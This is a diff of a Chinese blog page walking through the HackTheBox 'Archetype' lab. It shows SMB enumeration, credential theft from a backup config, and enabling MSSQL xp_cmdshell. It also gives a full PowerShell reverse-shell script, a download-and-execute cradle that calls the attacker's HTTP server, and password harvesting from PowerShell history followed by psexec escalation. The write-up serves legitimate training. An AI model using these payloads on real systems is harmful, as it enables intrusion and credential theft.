@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="实验环境 实验过程信息收集nmap扫描：1nmap -sC -sV 10.10.10.27  -sC：使用默认脚本进行扫描，等同于–script&#x3D;default-sV：探测开启的端口来获取服务、版本信息  可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口 445端口匿名访问测试445端口的SM">
+    <meta name="description" content="实验环境 实验过程信息收集nmap扫描：nmap -sC -sV 10.10.10.27  -sC：使用默认脚本进行扫描，等同于–script&#x3D;default-sV：探测开启的端口来获取服务、版本信息  可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口 445端口匿名访问测试445端口的SMB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HackTheBox-Archetype">
 <meta property="og:url" content="http://example.com/2021/07/13/HackTheBox-Archetype/index.html">
 <meta property="og:site_name" content="colind0pe&#39;s blog">
-<meta property="og:description" content="实验环境 实验过程信息收集nmap扫描：1nmap -sC -sV 10.10.10.27  -sC：使用默认脚本进行扫描，等同于–script&#x3D;default-sV：探测开启的端口来获取服务、版本信息  可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口 445端口匿名访问测试445端口的SM">
+<meta property="og:description" content="实验环境 实验过程信息收集nmap扫描：nmap -sC -sV 10.10.10.27  -sC：使用默认脚本进行扫描，等同于–script&#x3D;default-sV：探测开启的端口来获取服务、版本信息  可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口 445端口匿名访问测试445端口的SMB">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://i.loli.net/2021/07/12/m1YO5GTBC6jqoPt.png">
 <meta property="og:image" content="https://i.loli.net/2021/07/12/zqbrwsZEfTkXcOY.png">
@@ -177,19 +177,19 @@
 
   <div class="content" itemprop="articleBody">
     <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://i.loli.net/2021/07/12/m1YO5GTBC6jqoPt.png"></p>
-<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="nmap扫描："><a href="#nmap扫描：" class="headerlink" title="nmap扫描："></a>nmap扫描：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV 10.10.10.27</span><br></pre></td></tr></table></figure>
-
+<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="nmap扫描："><a href="#nmap扫描：" class="headerlink" title="nmap扫描："></a>nmap扫描：</h4><pre><code>nmap -sC -sV 10.10.10.27
+</code></pre>
 <p>-sC：使用默认脚本进行扫描，等同于–script=default<br>-sV：探测开启的端口来获取服务、版本信息</p>
 <p><img src="https://i.loli.net/2021/07/12/zqbrwsZEfTkXcOY.png"></p>
 <p>可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口</p>
 <h4 id="445端口匿名访问"><a href="#445端口匿名访问" class="headerlink" title="445端口匿名访问"></a>445端口匿名访问</h4><p>测试445端口的SMB服务是否支持匿名访问，没有经过权限配置可能默认允许所有人无需身份认证来匿名访问共享资源，使用smbclient来访问samba服务器的共享资源：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L //10.10.10.27/</span><br></pre></td></tr></table></figure>
-
+<pre><code>smbclient -N -L //10.10.10.27/
+</code></pre>
 <p>-N：匿名登录<br>-L：获取共享资源列表</p>
 <p><img src="https://i.loli.net/2021/07/12/NSm3xJlXt7sMAK4.png"></p>
 <p>可以看到存在一个backups目录，使用smbclient来访问：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N //10.10.10.27/backups</span><br></pre></td></tr></table></figure>
-
+<pre><code>smbclient -N //10.10.10.27/backups
+</code></pre>
 <p><img src="https://i.loli.net/2021/07/12/A8cunJbwH3BphVX.png"></p>
 <p>发现存在一个prod.dtsConfig文件,使用get命令下载到本地，查看文件内容，可以看到数据库配置信息：</p>
 <p><img src="https://i.loli.net/2021/07/12/o17Mu3zfOnsZ5x8.png"></p>
@@ -198,57 +198,62 @@
 </blockquote>
 <p><strong>安装</strong>：</p>
 <p>进入impacket目录，执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install .</span><br></pre></td></tr></table></figure>
-
+<pre><code>pip install .
+</code></pre>
 <p><img src="https://i.loli.net/2021/07/12/RGXP5Qjl3h6a7WM.png"></p>
 <p>用前面获得的账号和密码登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py sql_svc@10.10.10.27 -windows-auth</span><br></pre></td></tr></table></figure>
-
+<pre><code>mssqlclient.py sql_svc@10.10.10.27 -windows-auth
+</code></pre>
 <p><img src="https://i.loli.net/2021/07/12/JyWYrKpMLvNV1P2.png"></p>
 <p>判断当前是否拥有sysadmin权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)</span><br></pre></td></tr></table></figure>
-
+<pre><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
+</code></pre>
 <p><img src="https://i.loli.net/2021/07/12/zZmAQyGdqRb5cfC.png"></p>
 <p>返回值是1，代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行</p>
 <h3 id="使用数据库调用系统命令"><a href="#使用数据库调用系统命令" class="headerlink" title="使用数据库调用系统命令"></a>使用数据库调用系统命令</h3><p>依次写入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;Show Advanced Options&#x27;, 1;			\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项</span><br><span class="line">reconfigure;											\\确认上面的操作</span><br><span class="line">sp_configure;											\\查看当前sp_configure配置情况</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1						\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令</span><br><span class="line">reconfigure;											\\确认上面的操作</span><br><span class="line">xp_cmdshell &quot;whoami&quot; 									\\在靶机上调用cmdshell执行whoami</span><br></pre></td></tr></table></figure>
-
+<pre><code>EXEC sp_configure &#39;Show Advanced Options&#39;, 1;            \\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项
+reconfigure;                                            \\确认上面的操作
+sp_configure;                                            \\查看当前sp_configure配置情况
+EXEC sp_configure &#39;xp_cmdshell&#39;, 1                        \\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令
+reconfigure;                                            \\确认上面的操作
+xp_cmdshell &quot;whoami&quot;                                     \\在靶机上调用cmdshell执行whoami
+</code></pre>
 <p>执行结束后，SQL会返回当前数据库进程的操作系统用户为archetype\sql_svc</p>
 <p><img src="https://i.loli.net/2021/07/12/aIbOdf4lZ71eHyq.png"></p>
 <h3 id="获得操作系统普通用户权限"><a href="#获得操作系统普通用户权限" class="headerlink" title="获得操作系统普通用户权限"></a>获得操作系统普通用户权限</h3><p>我们已经可以在数据库执行系统命令，接下来我们需要反弹一个操作系统shell；</p>
 <p>在桌面新建一个powershell的反弹shell文件shell.ps1（<strong>注意将其中的ip修改为HTB分配的ip</strong>）</p>
 <p>代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.55&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;# &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br></pre></td></tr></table></figure>
-
+<pre><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.55&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;# &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()
+</code></pre>
 <p>下面我们搭建一个http服务器，让靶机下载我们的shell.ps1文件；</p>
 <p>因为我的shell.ps1文件在桌面，所以也在桌面终端执行搭建http服务器的命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
-
+<pre><code>python3 -m http.server 80
+</code></pre>
 <p><img src="https://i.loli.net/2021/07/12/BPoClYzDI3T18qk.png"></p>
 <p>然后开启一个监听端口，用来接收反弹的shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 443</span><br></pre></td></tr></table></figure>
-
+<pre><code>nc -lvvp 443
+</code></pre>
 <p><img src="https://i.loli.net/2021/07/12/SiAqEx789zZYwKJ.png"></p>
 <p>接着在数据库shell中执行如下命令，反弹shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.14.55/shell.ps1\&quot;);&quot;</span><br></pre></td></tr></table></figure>
-
+<pre><code>xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.14.55/shell.ps1\&quot;);&quot;
+</code></pre>
 <p><img src="https://i.loli.net/2021/07/12/fHnUJF6gtxzmbEO.png"></p>
 <h3 id="获取普通用户权限的flag"><a href="#获取普通用户权限的flag" class="headerlink" title="获取普通用户权限的flag"></a>获取普通用户权限的flag</h3><p>在nc接收的shell中直接执行下面的命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\sql_svc\Desktop\user.txt</span><br></pre></td></tr></table></figure>
-
+<pre><code>type C:\Users\sql_svc\Desktop\user.txt
+</code></pre>
 <p><img src="https://i.loli.net/2021/07/12/L9siVhJlfBKYGam.png"></p>
 <h3 id="获取系统权限用户的flag"><a href="#获取系统权限用户的flag" class="headerlink" title="获取系统权限用户的flag"></a>获取系统权限用户的flag</h3><p>使用下面的命令来访问PowerShell历史记录文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
-
+<pre><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+</code></pre>
 <p><img src="https://i.loli.net/2021/07/12/Dc6TqQ7bRgAkK9d.png"></p>
 <p>发现administrator用户登录后将共享文件夹\Archetype\backups映射到T盘，后面是administrator用户名和它的密码，可以使用Impacket中的psexec.py来提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py administrator@10.10.10.27</span><br></pre></td></tr></table></figure>
-
+<pre><code>psexec.py administrator@10.10.10.27
+</code></pre>
 <p>输入上面获得的密码就可以成功提权</p>
 <p><img src="https://i.loli.net/2021/07/12/BZmn8vYqEpbcW1k.png"></p>
 <p>执行如下命令获得flag：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
-
+<pre><code>type C:\Users\Administrator\Desktop\root.txt
+</code></pre>
 <p><img src="https://i.loli.net/2021/07/12/lBtDMgWAsP2nTLb.png"></p>
 <blockquote>
 <p>参考：</p>
